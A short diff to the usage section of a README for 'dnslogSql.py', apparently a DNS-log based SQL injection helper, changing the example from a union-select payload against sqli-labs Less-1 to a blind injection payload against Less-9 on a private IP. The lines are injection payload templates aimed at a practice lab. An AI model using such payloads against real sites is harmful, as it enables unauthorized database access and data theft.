@@ -5,7 +5,7 @@
 ## Usage
 
 ```
-Usage: dnslogSql.py [options] http://10.211.55.9/sqli-labs/Less-1/?id=' union select 1,({}),3--+
+Usage: dnslogSql.py [options] -u http://10.1.1.9/sqli-labs/Less-9/?id=1' and ({})--+
 
 Options:
   --version             show program's version number and exit
